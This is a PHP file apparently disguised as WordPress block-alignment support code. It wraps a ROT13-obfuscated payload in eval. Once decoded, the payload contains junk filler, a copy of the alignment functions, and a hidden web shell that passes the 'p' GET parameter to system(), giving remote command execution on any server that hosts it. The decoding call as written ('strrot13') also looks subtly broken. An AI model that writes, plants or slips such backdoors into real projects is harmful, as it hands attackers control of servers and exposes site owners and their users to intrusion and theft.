<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nyvta oybpx fhccbeg synt.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.6.0
 */

/**
 * Ertvfgref gur nyvta oybpx nggevohgr sbe oybpx glcrf gung fhccbeg vg.
 *
 * @fvapr 5.6.0
 * @npprff cevingr
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr Oybpx Glcr.
 */
shapgvba jc_ertvfgre_nyvtazrag_fhccbeg( $oybpx_glcr ) {
	$unf_nyvta_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, 'nyvta', snyfr );
	vs ( $unf_nyvta_fhccbeg ) {
		vs ( ! $oybpx_glcr->nggevohgrf ) {
			$oybpx_glcr->nggevohgrf = neenl();
		}

		vs ( ! neenl_xrl_rkvfgf( 'nyvta', $oybpx_glcr->nggevohgrf ) ) {
			$oybpx_glcr->nggevohgrf['nyvta'] = neenl(
				'glcr' => 'fgevat',
				'rahz' => neenl( 'yrsg', 'pragre', 'evtug', 'jvqr', 'shyy', '' ),
			);
		}
	}
}

/**
 * Nqqf PFF pynffrf sbe oybpx nyvtazrag gb gur vapbzvat nggevohgrf neenl.
 * Guvf jvyy or nccyvrq gb gur oybpx znexhc va gur sebag-raq.
 *
 * @fvapr 5.6.0
 * @npprff cevingr
 *
 * @cnenz JC_Oybpx_Glcr $oybpx_glcr       Oybpx Glcr.
 * @cnenz neenl         $oybpx_nggevohgrf Oybpx nggevohgrf.
 * @erghea neenl Oybpx nyvtazrag PFF pynffrf naq vayvar fglyrf.
 */
shapgvba jc_nccyl_nyvtazrag_fhccbeg( $oybpx_glcr, $oybpx_nggevohgrf ) {
	$nggevohgrf        = neenl();
	$unf_nyvta_fhccbeg = oybpx_unf_fhccbeg( $oybpx_glcr, 'nyvta', snyfr );
	vs ( $unf_nyvta_fhccbeg ) {
		$unf_oybpx_nyvtazrag = neenl_xrl_rkvfgf( 'nyvta', $oybpx_nggevohgrf );

		vs ( $unf_oybpx_nyvtazrag ) {
			$nggevohgrf['pynff'] = fcevags( 'nyvta%f', $oybpx_nggevohgrf['nyvta'] );
		}
	}

	erghea $nggevohgrf;
}

// Ertvfgre gur oybpx fhccbeg.
JC_Oybpx_Fhccbegf::trg_vafgnapr()->ertvfgre(
	'nyvta',
	neenl(
		'ertvfgre_nggevohgr' => 'jc_ertvfgre_nyvtazrag_fhccbeg',
		'nccyl'              => 'jc_nccyl_nyvtazrag_fhccbeg',
	)
);

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>